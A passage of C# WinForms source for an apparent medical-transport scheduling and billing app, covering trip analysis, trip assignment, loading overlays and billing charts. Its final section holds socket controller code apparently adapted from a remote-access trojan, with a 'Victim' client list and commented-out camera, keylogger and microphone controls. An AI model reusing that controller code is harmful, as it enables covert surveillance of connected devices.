                return;
            }
            fsbtn.Enabled = true;
            fsbdatepicker.Enabled = true;
            //await SetLoadingGifLabel("Finalizing");
            //loadinggifhandler_hidescreen();
        }

        //Auto Ass
        private async void aaloadbtn_Click(object sender, EventArgs e)
        {
            ShowLoadingGif();
            
            await SetLoadingGifLabel("Checking connections");
            if (await EnsureWellRydePortalSessionForBillingAsync())
                analyzer.SetWellRydePortalSession(_wellRydeSession);
            else
                analyzer.SetWellRydePortalSession(null);
            if (!await EnsureModivcareSessionAsync())
            {
                hidegiftimer.Start();
                return;
            }
            analyzer.IntializeAnalyzer(mcLoginHandler);
            await analyzer.StartAnalysis(aadatepicker.Value.ToLongDateString(), aadatepicker.Value.Day, aadatepicker.Value.Year, aadatepicker.Value);
            await SetLoadingGifLabel("Downloading trips");
            await SetLoadingGifLabel("Starting analyzer…");
            await SetLoadingGifLabel("Load your schedule for selected date (" + aadatepicker.Value.ToLongDateString() + ")");
            aastatuslbl.Text = "Status: Please choose a schedule to analyze.";

            OpenFileDialog openFileDialog1 = new OpenFileDialog
            {
                InitialDirectory = @"C:\Users\rneal\OneDrive\Desktop",
                Title = "Browse Schedule Files",

                CheckFileExists = true,
                CheckPathExists = true,

                DefaultExt = ".xlsx",
                Filter = "workbook files (*.xlsx)|*.xlsx",
                FilterIndex = 2,
                RestoreDirectory = true
            };

            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                await SetLoadingGifLabel("Splitting schedule");
                await Task.Delay(1000);
                aastatuslbl.Text = "Status: Splitting schedule..";
                aalv.Items.Clear();

                try
                {
                    await analyzer.SplitFile(AppContext.BaseDirectory, openFileDialog1.FileName);
                }
                catch (ScheduleLoadException ex)
                {
                    hidegiftimer.Start();
                    MessageBox.Show(
                        "Schedule load failed. Fix the problem in your Excel file and try again.\n\n" + ex.Message,
                        "Schedule Load Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    aastatuslbl.Text = "Status: Schedule load failed. See message for details.";
                    return;
                }
                catch (Exception ex)
                {
                    hidegiftimer.Start();
                    MessageBox.Show(
                        "Unexpected error while loading/splitting the schedule.\n\n" + ex.Message,
                        "Schedule Load Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                    aastatuslbl.Text = "Status: Schedule load failed.";
                    return;
                }

                await SetLoadingGifLabel("Analyzing schedule…");
                await Task.Delay(2000);

                try
                {
                    analyzer.AnalyzeTrips(aadatepicker.Value);
                }
                catch (ScheduleAnalysisException ex)
                {
                    hidegiftimer.Start();
                    MessageBox.Show(
                        "Analysis failed. Check the schedule or trip data and try again.\n\n" + ex.Message,
                        "Analysis Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Warning);
                    aastatuslbl.Text = "Status: Analysis failed. See message for details.";
                    return;
                }
                catch (Exception ex)
                {
                    hidegiftimer.Start();
                    MessageBox.Show(
                        "Unexpected error during analysis.\n\n" + ex.Message,
                        "Analysis Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error);
                    aastatuslbl.Text = "Status: Analysis failed.";
                    return;
                }
            }
            else
            {
                await SetLoadingGifLabel("Cancelling process..");
                hidegiftimer.Start();
                return;
            }

            foreach (MCDownloadedTrip loggedtrip in analyzer.loggedScheduleTrips)
            {
                bool reservecancel = false;
                if (loggedtrip.DriverNameParsed == "Reserves")
                {
                    if (loggedtrip.GetAlerts().Contains("Cancelled"))
                    {
                        reservecancel = true;
                    }
                }
                if (!reservecancel)
                {
                    ListViewItem lvi = new ListViewItem();
                    lvi.Text = loggedtrip.TripNumber;

                    lvi.SubItems.Add(loggedtrip.Date);
                    lvi.SubItems.Add(loggedtrip.GetAlerts());
                    lvi.SubItems.Add(loggedtrip.DriverNameParsed);
                    lvi.SubItems.Add(loggedtrip.ClientFullName);
                    lvi.SubItems.Add(loggedtrip.PUTime);
                    lvi.SubItems.Add(loggedtrip.PUStreet);
                    lvi.SubItems.Add(loggedtrip.PUCity);
                    lvi.SubItems.Add(loggedtrip.PUTelephone);
                    lvi.SubItems.Add(loggedtrip.DOTime);
                    lvi.SubItems.Add(loggedtrip.DOStreet);
                    lvi.SubItems.Add(loggedtrip.DOCITY);
                    lvi.SubItems.Add(loggedtrip.DOTelephone);
                    lvi.SubItems.Add(loggedtrip.Comments);
                    lvi.BackColor = loggedtrip.GetColor();
                    aalv.Items.Add(lvi);
                }

            }

            reportCard = new ReportCard(hiatmeTabControl.SelectedTab, aaassbtn);

            reportCard.StartReport(analyzer.gradeList);


            await SetLoadingGifLabel("Analysis complete. Loading report card…");

            


            aalv.Columns[2].Text = "Alerts: " + analyzer.ReturnAlertCount().ToString();
            int assignPreview = analyzer.GetPlannedWellRydeAssignSlotCount();
            aastatuslbl.Text = "Status: Analysis completed with " + analyzer.ReturnAlertCount().ToString() + " alerts. Assign preview: " + assignPreview.ToString() + " trip(s) matched WellRyde for ASSIGN. Re-analyze after schedule changes.";
            hidegiftimer.Start();


        }
        private async void aaassbtn_Click(object sender, EventArgs e)
        {
            ShowLoadingGif();
            try
            {
                await SetLoadingGifLabel("Are you sure you want to assign trips?");
                DialogResult dialogResult = MessageBox.Show("Are you sure you want to assign trips?", "Assign Trips", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    //do something
                    await SetLoadingGifLabel("Preparing to assign trips");
                    aastatuslbl.Text = "Status: Preparing to assign trips..";
                    if (analyzer.drivertablist == null)
                    {
                        await SetLoadingGifLabel("You must load a schedule to continue. Exiting");
                        aastatuslbl.Text = "Status: Select a date and click 'Load Schedule' or assign trips when ready.";
                        hidegiftimer.Start();
                        MessageBox.Show("You must load a schedule to continue.");
                        return;
                    }
                    await SetLoadingGifLabel("Checking WellRyde connection");
                    if (await EnsureWellRydePortalSessionForBillingAsync())
                        analyzer.SetWellRydePortalSession(_wellRydeSession);
                    else
                        analyzer.SetWellRydePortalSession(null);
                    await analyzer.StartTripAssigning(aadatepicker.Value.ToLongDateString(), aadatepicker.Value.Day, aadatepicker.Value.Year, aadatepicker.Value);
                }
                else if (dialogResult == DialogResult.No)
                {
                    //do something else
                    await SetLoadingGifLabel("Cancelling process..");
                    hidegiftimer.Start();
                    aastatuslbl.Text = "Status: Select a date and click 'Load Schedule' or assign trips when ready.";
                    return;
                }
            }

            catch (Exception ex)
            {
                hidegiftimer.Start();
            }
            await SetLoadingGifLabel("Finalizing process..");
            hidegiftimer.Start();
            var baseMsg = "Status: Assign step finished — WellRyde list shows " + analyzer.GetAssignedTripCount().ToString() + " Assigned and " + analyzer.GetReservedTripCount().ToString() + " Reserved.";
            if (!Analyzer.WellRydePortalAssignAndUnassignCallsServer)
                aastatuslbl.Text = baseMsg + " Assign/unassign from this button does not change the portal yet; assign in the browser if needed.";
            else
                aastatuslbl.Text = baseMsg;
        }
        private async void aareservesbtn_Click(object sender, EventArgs e)
        {
            ShowLoadingGif();
            await SetLoadingGifLabel("Checking connections");
            if (await EnsureWellRydePortalSessionForBillingAsync())
                analyzer.SetWellRydePortalSession(_wellRydeSession);
            else
                analyzer.SetWellRydePortalSession(null);
            if (!await EnsureModivcareSessionAsync())
            {
                hidegiftimer.Start();
                return;
            }
            analyzer.IntializeAnalyzer(mcLoginHandler);

            await analyzer.PullReserves(aadatepicker.Value.ToLongDateString(), aadatepicker.Value.Day, aadatepicker.Value.Year, aadatepicker.Value);
            hidegiftimer.Start();
        }

        //Employee Production

        private EmployeeStatManager EmployeeTable { get; set; }
        public async void CreateEmployeeStatTable()
        {
            _employeeStatsLoadCts?.Cancel();
            _employeeStatsLoadCts?.Dispose();
            _employeeStatsLoadCts = new CancellationTokenSource();
            var loadToken = _employeeStatsLoadCts.Token;
            try
            {
                empStatManager = new EmployeeStatManager(tabPage8, mcLoginHandler);
                empStatManager.UpdateLoadingScreen += loadinggifhandler_update;
                empStatManager.ShowLoadingScreen += loadinggifhandler_showscreen;
                empStatManager.HideLoadingScreen += loadinggifhandler_hidescreen;

                WellRydePortalSession wrSession = null;
                if (await EnsureWellRydePortalSessionForBillingAsync())
                    wrSession = _wellRydeSession;
                if (!await EnsureModivcareSessionAsync())
                    return;
                await empStatManager.InitializeEmployeeDler(this, wrSession, null, loadToken);
            }
            catch (OperationCanceledException)
            {
                // Newer tab visit or form close cancelled this load.
                hidegiftimer.Start();
            }
        }






        private void loadinggifhandler_update(string text)
        {
            ApplyLoadingGifLabel(text);
        }
        private void loadinggifhandler_showscreen()
        {
            ShowLoadingGif();
        }
        private void loadinggifhandler_hidescreen()
        {
            hidegiftimer.Start();
        }
        private void LoadingGifSkipBtn_Click(object sender, EventArgs e)
        {
            ApplyLoadingGifLabel("Skipping…");
            billtimer.Stop();
            loadinggifhandler_hidescreen();
            //LoadingGifSkipBtn.Visible = false;
        }















        public void ShowLoadingGif()
        {
            if (hiatmeTabControl == null || hiatmeTabControl.TabCount == 0 || IsDisposed)
                return;
            int idx = hiatmeTabControl.SelectedIndex;
            if (idx < 0)
                idx = 0;
            if (idx >= hiatmeTabControl.TabCount)
                idx = hiatmeTabControl.TabCount - 1;
            LoadingGifCard.Parent = hiatmeTabControl.TabPages[idx];
            LoadingGifCard.BringToFront();
            LoadingGifCard.Dock = DockStyle.Fill;
            LoadingGifCard.BackColor = Color.Black;
            LoadingGifCard.Visible = true;
        }

        public void HideLoadingGif()
        {
            if (IsDisposed)
                return;
            try
            {
                LoadingGifCard.Visible = false;
            }
            catch (ObjectDisposedException)
            {
                // ignore
            }
        }

        /// <summary>Updates the loading overlay caption from any thread; avoids BackgroundWorker and multi-second artificial delays.</summary>
        private void ApplyLoadingGifLabel(string txt)
        {
            if (_applicationExitRequested || IsDisposed)
                return;
            try
            {
                var text = txt ?? string.Empty;
                if (LoadingGifLabel == null)
                    return;
                if (LoadingGifLabel.InvokeRequired)
                    LoadingGifLabel.BeginInvoke((MethodInvoker)(() =>
                    {
                        if (!IsDisposed && LoadingGifLabel != null && !LoadingGifLabel.IsDisposed)
                            LoadingGifLabel.Text = text;
                    }));
                else if (!LoadingGifLabel.IsDisposed)
                    LoadingGifLabel.Text = text;
            }
            catch (ObjectDisposedException)
            {
                // ignore
            }
        }

        //charts
        private void DrawAccuracyChart(List<MCDriver> driverslist)
        {

            tcchart.Series["Accuracies"].Points.Clear();
            tcchart.Series["Accuracies"].LabelForeColor = Color.White;
            tcchart.ChartAreas["TCChartArea"].AxisX.LabelStyle.ForeColor = Color.White;
            tcchart.ChartAreas["TCChartArea"].AxisX.LabelStyle.Font = new System.Drawing.Font("Microsoft Sans Serif", 10F, System.Drawing.FontStyle.Regular);

            tcchart.ChartAreas["TCChartArea"].AxisY.LabelStyle.ForeColor = Color.White;

            tcchart.ChartAreas["TCChartArea"].Axes[0].LineColor = Color.White;
            tcchart.ChartAreas["TCChartArea"].Axes[1].LineColor = Color.White;

            tcchart.ChartAreas["TCChartArea"].AxisX.TitleForeColor = Color.White;
            tcchart.ChartAreas["TCChartArea"].AxisY.TitleForeColor = Color.White;

            tcchart.ChartAreas["TCChartArea"].AxisX.Interval = 1;

            StripLine stripline = new StripLine();
            stripline.IntervalOffset = 70;
            stripline.StripWidth = 1;
            stripline.BackColor = Color.Orange;

            tcchart.ChartAreas["TCChartArea"].AxisY.StripLines.Add(stripline);

            int point = 0;
            foreach (MCDriver driver in driverslist)
            {
                //Console.WriteLine("price: " + priceandnumofthem.Key + " amount: " + priceandnumofthem.Value);

                tcchart.Series["Accuracies"].Points.Add((int)driver.AccuracyPercent);

                if ((int)driver.AccuracyPercent > 70)
                {
                    tcchart.Series["Accuracies"].Points[point].Color = Color.ForestGreen;
                }
                else
                {
                    tcchart.Series["Accuracies"].Points[point].Color = Color.DarkRed;
                }

                tcchart.Series["Accuracies"].Points[point].LabelForeColor = Color.White;
                tcchart.Series["Accuracies"].Points[point].AxisLabel = SplitDriverName(driver.Driver);
                tcchart.Series["Accuracies"].Points[point].LegendText = "...";
                tcchart.Series["Accuracies"].Points[point].Label = driver.AccuracyPercent.ToString() + "%";
                point++;
            }

        }
        private void DrawBillableVsLossesChart(decimal billtotal, bool submit, bool billextra)
        {
            decimal billabletotaldouble = 0;
            string billablegtotalstr = string.Empty;

            decimal billedtotaldouble = 0;
            string billedtotalstr = string.Empty;

            if (submit)
            {
                if (billextra)
                {
                    billedtotaldouble = Math.Round(wrBillingTool.WRCalculations.CalculateBillAllTotal(), 2, MidpointRounding.AwayFromZero);
                    billedtotalstr = wrBillingTool.WRCalculations.CalculateBillAllTotal().ToString();
                }
                else
                {
                    billedtotaldouble = billtotal;
                    billedtotalstr = billtotal.ToString();
                }
            }
            else
            {

                if (billextra)
                {
                    billabletotaldouble = Math.Round(wrBillingTool.WRCalculations.CalculateBillableTotal(), 2, MidpointRounding.AwayFromZero);
                    billablegtotalstr = wrBillingTool.WRCalculations.CalculateBillableTotal().ToString();

                    billedtotaldouble = Math.Round(wrBillingTool.WRCalculations.CalculateBilledTotal(), 2, MidpointRounding.AwayFromZero);
                    billedtotalstr = wrBillingTool.WRCalculations.CalculateBilledTotal().ToString();
                }
                else
                {
                    billabletotaldouble = Math.Round(wrBillingTool.WRCalculations.CalculateNoobBilledTotal(), 2, MidpointRounding.AwayFromZero);
                    billablegtotalstr = wrBillingTool.WRCalculations.CalculateNoobBilledTotal().ToString();

                    billedtotaldouble = Math.Round(wrBillingTool.WRCalculations.CalculateBilledTotal(), 2, MidpointRounding.AwayFromZero);
                    billedtotalstr = wrBillingTool.WRCalculations.CalculateBilledTotal().ToString();
                }

















                    /*
                    if (drawbillable)
                    {
                        billingtotaldouble = Math.Round(wrBillingTool.WRCalculations.CalculateSimpleBillableTotal(), 2, MidpointRounding.AwayFromZero);
                        billingtotalstr = wrBillingTool.WRCalculations.CalculateSimpleBillableTotal().ToString();
                    }
                    else
                    {
                        billingtotaldouble = Math.Round(wrBillingTool.WRCalculations.CalculateBillableTotal(), 2, MidpointRounding.AwayFromZero);
                        billingtotalstr = wrBillingTool.WRCalculations.CalculateBillableTotal().ToString();
                    }


                    billedtotaldouble = Math.Round(wrBillingTool.WRCalculations.CalculateBilledTotal(), 2, MidpointRounding.AwayFromZero);
                    billedtotalstr = wrBillingTool.WRCalculations.CalculateBilledTotal().ToString();
                    */
                }

            incomevslosseschart.Series["Totals"].Points.Clear();

            /*
            if (billingtotaldouble == 0 & billedtotaldouble == 0)
            {
                return;
            }
            */
            incomevslosseschart.Series["Totals"].Points.Clear();
            incomevslosseschart.Series["Totals"].LabelForeColor = Color.White;


            incomevslosseschart.ChartAreas["ChartArea1"].AxisX.LabelStyle.ForeColor = Color.White;
            incomevslosseschart.ChartAreas["ChartArea1"].AxisY.LabelStyle.ForeColor = Color.White;

            incomevslosseschart.ChartAreas["ChartArea1"].Axes[0].LineColor = Color.White;
            incomevslosseschart.ChartAreas["ChartArea1"].Axes[1].LineColor = Color.White;

            incomevslosseschart.ChartAreas["ChartArea1"].AxisX.TitleForeColor = Color.White;
            incomevslosseschart.ChartAreas["ChartArea1"].AxisY.TitleForeColor = Color.White;

            string mismatchtotal = wrBillingTool.FindTripPriceMismatches().Count.ToString();

            incomevslosseschart.Series["Totals"].Points.Add(Convert.ToDouble(billabletotaldouble));
            incomevslosseschart.Series["Totals"].Points[0].Color = Color.Green;
            incomevslosseschart.Series["Totals"].Points[0].LabelForeColor = Color.White;
            incomevslosseschart.Series["Totals"].Points[0].AxisLabel = "Billable";
            incomevslosseschart.Series["Totals"].Points[0].LegendText = "Billable";
            incomevslosseschart.Series["Totals"].Points[0].Label = billablegtotalstr;

            incomevslosseschart.Series["Totals"].Points.Add(Convert.ToDouble(billedtotaldouble));
            incomevslosseschart.Series["Totals"].Points[1].Color = Color.RoyalBlue;
            incomevslosseschart.Series["Totals"].Points[1].LabelForeColor = Color.White;
            incomevslosseschart.Series["Totals"].Points[1].AxisLabel = "Billed";
            incomevslosseschart.Series["Totals"].Points[1].LegendText = "Billed";
            incomevslosseschart.Series["Totals"].Points[1].Label = billedtotalstr;
        }

        private void DrawPriceGroupChart(IDictionary<decimal, int> pricegroups)
        {

            pgchart.Series["Totals"].Points.Clear();
            pgchart.Series["Totals"].LabelForeColor = Color.White;
            pgchart.ChartAreas["PGChartArea"].AxisX.LabelStyle.ForeColor = Color.White;
            pgchart.ChartAreas["PGChartArea"].AxisY.LabelStyle.ForeColor = Color.White;

            pgchart.ChartAreas["PGChartArea"].Axes[0].LineColor = Color.White;
            pgchart.ChartAreas["PGChartArea"].Axes[1].LineColor = Color.White;

            pgchart.ChartAreas["PGChartArea"].AxisX.TitleForeColor = Color.White;
            pgchart.ChartAreas["PGChartArea"].AxisY.TitleForeColor = Color.White;

            pgchart.ChartAreas["PGChartArea"].AxisX.Interval = 1;

            int point = 0;
            foreach (KeyValuePair<decimal, int> priceandnumofthem in pricegroups)
            {
                //Console.WriteLine("price: " + priceandnumofthem.Key + " amount: " + priceandnumofthem.Value);

                pgchart.Series["Totals"].Points.Add(priceandnumofthem.Value);
                pgchart.Series["Totals"].Points[point].Color = Color.SlateGray;
                pgchart.Series["Totals"].Points[point].LabelForeColor = Color.White;
                pgchart.Series["Totals"].Points[point].AxisLabel = priceandnumofthem.Key.ToString();
                pgchart.Series["Totals"].Points[point].LegendText = priceandnumofthem.Value.ToString();
                pgchart.Series["Totals"].Points[point].Label = priceandnumofthem.Value.ToString();
                point++;
            }

        }




        //events
        private void tbcb_SelectedIndexChanged(object sender, EventArgs e)
        {
            tbtemplatenamecb.Items.Clear();
            templatelv.Items.Clear();
            if (hiatmeTabControl.SelectedTab == hiatmeTabControl.TabPages["tabPage5"])//your specific tabname
            {
                string s = (string)tbcb.Text;
                //Console.WriteLine(s);
                tbuilder.GetAvailibleTemplatesForDay(s);
                foreach (KeyValuePair<string, IDictionary<string, string[]>> drivertriplist in tbuilder.driverTripList)
                {
                    // do something with entry.Value or entry.Key

                    //  Console.WriteLine(drivertriplist.Key);
                    tbtemplatenamecb.Items.Add(drivertriplist.Key);
                    tbtemplatenamecb.SelectedIndex = 0;
                    // VerifyDriverTripsInfo(drivertriplist);
                }
            }
        }
        private void tbtemplatenamecb_SelectedIndexChanged(object sender, EventArgs e)
        {
            templatelv.Items.Clear();

            foreach (KeyValuePair<string, IDictionary<string, string[]>> drivertriplist in tbuilder.driverTripList)
            {
                //Console.WriteLine(drivertriplist.Key + " " + tbtemplatenamecb.Text);
                if (drivertriplist.Key == tbtemplatenamecb.Text)
                {
                    foreach (KeyValuePair<string, string[]> trip in drivertriplist.Value)
                    {
                        ListViewItem lvi = new ListViewItem();
                        lvi.Text = trip.Value[0];
                        lvi.SubItems.Add(trip.Value[1]);
                        lvi.SubItems.Add(trip.Value[2]);
                        lvi.SubItems.Add(trip.Value[3]);
                        lvi.SubItems.Add(trip.Value[4]);
                        lvi.SubItems.Add(trip.Value[5]);
                        lvi.SubItems.Add(trip.Value[6]);
                        lvi.SubItems.Add(trip.Value[7]);
                        lvi.SubItems.Add(trip.Value[8]);
                        lvi.SubItems.Add(trip.Value[9]);
                        lvi.SubItems.Add(trip.Value[10]);
                        lvi.SubItems.Add(trip.Value[11]);
                        lvi.SubItems.Add(trip.Value[12]);

                        templatelv.Items.Add(lvi);
                    }
                }


                //Console.WriteLine(drivertriplist.Key);
                //tbtemplatenamecb.Items.Add(drivertriplist.Key);
                //tbtemplatenamecb.SelectedIndex = 0;
                // VerifyDriverTripsInfo(drivertriplist);
            }
        }
        private async void hiatmeTabControl_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                if (hiatmeTabControl.SelectedTab == tabPage1)
                    pictureBox1?.Invalidate();
            }
            catch
            {
                // ignore
            }

            if (hiatmeTabControl.SelectedTab == hiatmeTabControl.TabPages["tabPage8"])
            {

                CreateEmployeeStatTable();
                
                //await Task.Delay(3000);
                
                
            }



                if (hiatmeTabControl.SelectedTab == hiatmeTabControl.TabPages["tabPage5"])//your specific tabname
            {
                tbtemplatenamecb.Items.Clear();
                tbstatuslbl.Text = "Status: To add or replace a template click 'ADD TEMPLATE' and choose a schedule. A template will be created for the week day of the selected schedule.";
                string s = (string)tbcb.Text;
                tbuilder.GetAvailibleTemplatesForDay(s);
                foreach (KeyValuePair<string, IDictionary<string, string[]>> drivertriplist in tbuilder.driverTripList)
                {
                    // do something with entry.Value or entry.Key
                    Console.WriteLine(drivertriplist.Key);
                    tbtemplatenamecb.Items.Add(drivertriplist.Key);
                    tbtemplatenamecb.SelectedIndex = 0;
                    // VerifyDriverTripsInfo(drivertriplist);
                }
            }
            if (hiatmeTabControl.SelectedTab == hiatmeTabControl.TabPages["tabPage6"])//your specific tabname
            {
                sbstatuslbl.Text = "Status: To build a schedule, select a date and click 'BUILD'. Follow the prompt to save in a desired location.";

            }

        }
        private void listView_ColumnClick(object sender, ColumnClickEventArgs e)
        {

        }
        private void listView_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            ListView listView = (ListView)sender;
            // Draw the standard header background.
            Color lvbg = ColorTranslator.FromHtml("#333333");

            SolidBrush bluegrayBrush = new SolidBrush(lvbg);

            e.Graphics.FillRectangle(bluegrayBrush, e.Bounds);

            Rectangle rowBounds = e.Bounds;
            Rectangle bounds = new Rectangle(rowBounds.Left + 10, rowBounds.Top, e.ColumnIndex == 0 ? 250 : (rowBounds.Width - 10 - 1), rowBounds.Height);
            if (e.ColumnIndex == 0)
            {
                /*
               // listView.BeginUpdate();
                CheckBoxRenderer.DrawCheckBox(e.Graphics, new Point(e.Bounds.Left + 18, e.Bounds.Top + 7), 
                    false ? System.Windows.Forms.VisualStyles.CheckBoxState.CheckedNormal :
                    System.Windows.Forms.VisualStyles.CheckBoxState.UncheckedNormal);
                */
               // listView.EndUpdate();
                //CheckBoxRenderer.DrawCheckBox(e.Graphics, new Point(e.Bounds.Left + 18, e.Bounds.Top + 7), System.Windows.Forms.VisualStyles.CheckBoxState.UncheckedNormal);
            }
            // Draw the header text.
            using (Font headerFont =
                            new Font("Archivo Medium", 11, FontStyle.Regular))
            {
                TextFormatFlags align;
                switch (listView.Columns[e.ColumnIndex].TextAlign)
                {
                    case HorizontalAlignment.Right:
                        align = TextFormatFlags.Right;
                        break;
                    case HorizontalAlignment.Center:
                        align = TextFormatFlags.HorizontalCenter;
                        break;
                    default:
                        align = TextFormatFlags.Left;
                        break;
                }
                TextRenderer.DrawText(e.Graphics, e.Header.Text, headerFont, bounds, Color.Gainsboro,
                    align | TextFormatFlags.SingleLine | TextFormatFlags.GlyphOverhangPadding | TextFormatFlags.VerticalCenter | TextFormatFlags.WordEllipsis);
            }

            return;
        }
        private void listView_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            ListView listView = (ListView)sender;
            if ((e.State & ListViewItemStates.Selected) != 0)
            {
                if (listView.Focused && e.Item.Selected)
                {

                    Rectangle R = e.Bounds;
                    R.Inflate(-1, -1);
                    using (Brush brush = new SolidBrush(Color.RoyalBlue))
                    {
                        e.Graphics.FillRectangle(brush, R);
                    }
                    using (Pen pen = new Pen(Color.Black, 1.5f))
                    {
                        e.Graphics.DrawRectangle(pen, R);
                    }
                }
                else
                {
                    e.DrawBackground();
                }
            }
            else
            {
                // Draw the background for an unselected item.
                //e.DrawBackground();
            }

            // Draw the item text for views other than the Details view.
            if (listView.View != System.Windows.Forms.View.Details)
            {

                e.DrawText();
            }
            /*
            if (e.Item.Checked)

                ControlPaint.DrawCheckBox(e.Graphics, e.Bounds.Left + 18, e.Bounds.Top + 6, 15, 15, ButtonState.Checked);
            else
                ControlPaint.DrawCheckBox(e.Graphics, e.Bounds.Left + 18, e.Bounds.Top + 6, 15, 15, ButtonState.Flat);
            */
        }
        private void listView_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            ListView listView = (ListView)sender;

            Rectangle rowBounds = e.Bounds;
            Rectangle bounds = new Rectangle(rowBounds.Left + 10, rowBounds.Top, e.ColumnIndex == 0 ? 250 : (rowBounds.Width + 10 - 1), rowBounds.Height);

            using (Font headerFont =
                    new Font("Ariel", 10, FontStyle.Regular))
            {
                TextFormatFlags align;
                switch (listView.Columns[e.ColumnIndex].TextAlign)
                {
                    case HorizontalAlignment.Right:
                        align = TextFormatFlags.Right;
                        break;
                    case HorizontalAlignment.Center:
                        align = TextFormatFlags.HorizontalCenter;
                        break;
                    default:
                        align = TextFormatFlags.Left;
                        break;
                }
                TextRenderer.DrawText(e.Graphics, e.SubItem.Text, headerFont, bounds, Color.White,
                    align | TextFormatFlags.SingleLine | TextFormatFlags.GlyphOverhangPadding | TextFormatFlags.VerticalCenter | TextFormatFlags.WordEllipsis);
                //e.DrawBackground();

            }


        }
        private void ListView_SizeChanged(object sender, EventArgs e)
        {
            billinglistview.Columns[13].Width = 500;
            //billinglistview.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
            //billinglistview.Columns[11].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);

            int columnwidths = 0;
            ListView.ColumnHeaderCollection cc = billinglistview.Columns;
            for (int i = 0; i < cc.Count; i++)
            {
                ///Console.WriteLine(cc[i].Width);
                if (i < 11)
                {
                    columnwidths += cc[i].Width;
                }
                //billinglistview.Columns[11].Width = (billinglistview.Width - columnwidths);
                //Console.WriteLine(columnwidths);
                //int colWidth = TextRenderer.MeasureText(cc[i].Text, billinglistview.Font).Width + 10;

                //if (colWidth > cc[i].Width)
                //{
                    //cc[i].Width = colWidth;
                //}
            }


        }
        private void billinglistview_ColumnClick(object sender, ColumnClickEventArgs e)
        {

        }








        List<Victim> victim_list = new List<Victim>();

        public static int port_no = 8443;
        public static string PASSWORD = string.Empty;

        public static Socket oursocket = default;
        private const string IP = "127.0.0.1";

        public static HttpClient ServerHttpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(15) };
        private System.Windows.Forms.Timer _clientListTimer;


        public async void Connect_Setup()
        {
            if (_applicationExitRequested)
                return;
            await Task.Run(async () =>
            {
                try
                {
                    if (_applicationExitRequested)
                        return;
                    if (_clientListTimer != null)
                    {
                        _clientListTimer.Stop();
                        _clientListTimer.Dispose();
                        _clientListTimer = null;
                    }
                    await FetchClientsListOnce();
                    if (_applicationExitRequested)
                        return;
                    _clientListTimer = new System.Windows.Forms.Timer();
                    _clientListTimer.Interval = 4000;
                    _clientListTimer.Tick += async (s, e) => await FetchClientsListOnce();
                    _clientListTimer.Start();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                    if (_applicationExitRequested)
                        return;
                    await Task.Delay(2000);
                    if (!_applicationExitRequested)
                        Connect_Setup();
                }
            });
        }

        private async Task FetchClientsListOnce()
        {
            if (_applicationExitRequested)
                return;
            try
            {
                var baseUrl = (MainValues.ServerApiBase ?? "http://localhost:3000").TrimEnd('/');
                var response = await ServerHttpClient.GetAsync(baseUrl + "/api/clients");
                response.EnsureSuccessStatusCode();
                var json = await response.Content.ReadAsStringAsync();
                var jo = JObject.Parse(json);
                var clientsArray = jo["clients"]?.ToString() ?? "[]";
                var arrstr = new[] { "RECCLIENTLIST", clientsArray };
                if (_applicationExitRequested || !IsHandleCreated || IsDisposed)
                    return;
                Invoke((MethodInvoker)delegate { ModifyClientListCheck(arrstr); });
            }
            catch (Exception ex)
            {
                Console.WriteLine("Fetch clients: " + ex.Message);
            }
        }

        public async void infoAl(Socket sckInf)
        {
            lock (_infoAlSocketsLock)
                _infoAlActiveSockets.Add(sckInf);
            try
            {
                NetworkStream networkStream = new NetworkStream(sckInf);
                System.Text.StringBuilder sb = new System.Text.StringBuilder();
                int thisRead = 0;
                int blockSize = 2048;
                byte[] dataByte = new byte[blockSize];
                while (!_applicationExitRequested)
                {
                    thisRead = await networkStream.ReadAsync(dataByte, 0, blockSize);
                    if (thisRead == 0)
                        break;
                    sb.Append(System.Text.Encoding.UTF8.GetString(dataByte, 0, thisRead));
                    sb = sb.Replace("[0x09]KNT[VERI][0x09]<EOF>", "");
                    while (sb.ToString().Trim().Contains("<EOF>"))
                    {
                        string veri = sb.ToString().Substring(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf("<EOF>") + 5);
                        Data_Coming_From_Our_Socket(veri.Replace("<EOF>", "").Replace("[0x09]KNT[VERI][0x09]", ""));
                        sb.Remove(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf("<EOF>") + 5);
                    }
                }
            }
            catch (Exception)
            {
                //Prev.global_cam.StopCamera(); key_gonder = false; micStop();
                //stopProjection(); Baglanti_Kur();
            }
            finally
            {
                lock (_infoAlSocketsLock)
                    _infoAlActiveSockets.Remove(sckInf);
            }
        }
        public async void sendToSocket(string tag, string mesaj)
        {
            try
            {
                //Console.WriteLine("boo");
                //Console.WriteLine(mesaj);
                using (NetworkStream ns = new NetworkStream(oursocket))
                {
                    byte[] cmd = System.Text.Encoding.UTF8.GetBytes("[0x09]" + tag + mesaj + $"<EOF{PASSWORD}>");
                    await ns.WriteAsync(cmd, 0, cmd.Length);
                }

            }
            catch (Exception) { }
        }
        public void SetSocketKeepAliveValues(Socket instance, int KeepAliveTime, int KeepAliveInterval)
        {
            //KeepAliveTime: default value is 2hr
            //KeepAliveInterval: default value is 1s and Detect 5 times

            //the native structure
            //struct tcp_keepalive {
            //ULONG onoff;
            //ULONG keepalivetime;
            //ULONG keepaliveinterval;
            //};

            int size = Marshal.SizeOf(new uint());
            byte[] inOptionValues = new byte[size * 3]; // 4 * 3 = 12
            bool OnOff = true;

            BitConverter.GetBytes((uint)(OnOff ? 1 : 0)).CopyTo(inOptionValues, 0);
            BitConverter.GetBytes((uint)KeepAliveTime).CopyTo(inOptionValues, size);
            BitConverter.GetBytes((uint)KeepAliveInterval).CopyTo(inOptionValues, size * 2);

            instance.IOControl(IOControlCode.KeepAliveValues, inOptionValues, null);
        }
        private async void RequestClientsList()
        {
            if (_applicationExitRequested)
